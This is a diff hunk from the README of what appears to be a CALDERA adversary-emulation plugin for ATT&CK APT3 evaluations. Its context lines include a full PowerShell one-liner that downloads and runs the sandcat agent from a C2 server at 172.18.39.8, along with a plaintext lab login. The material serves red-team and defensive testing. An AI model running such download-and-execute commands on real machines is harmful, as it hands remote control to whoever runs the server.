@@ -52,6 +52,6 @@ Please read the [full documentation](https://github.com/mitre/caldera/wiki/Plugi
    * Execute the PowerShell command: `$url="http://172.18.39.8:8888/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$output="C:\Users\Public\sandcat.exe";$wc.DownloadFile($url,$output);C:\Users\Public\sandcat.exe -server http://172.18.39.8:8888 -group evals_caldera -v;`
    * The 54ndc47 agent should now be checked in with CALDERA (172.18.39.8)
 
-3. Browse to the CALDERA UI `(http://CALDERAPublicIp:8888)`
+3. Browse to the CALDERA GUI
    * Login - wardog:B3tt3r!
    * Start an operation using the [ATT&CK Eval APT3 - Full](https://github.com/d4weiss/evals_caldera/blob/master/data/adversaries/ef93dd1b-809b-4a0b-b686-fef549cabbe4.yml) adversary profile
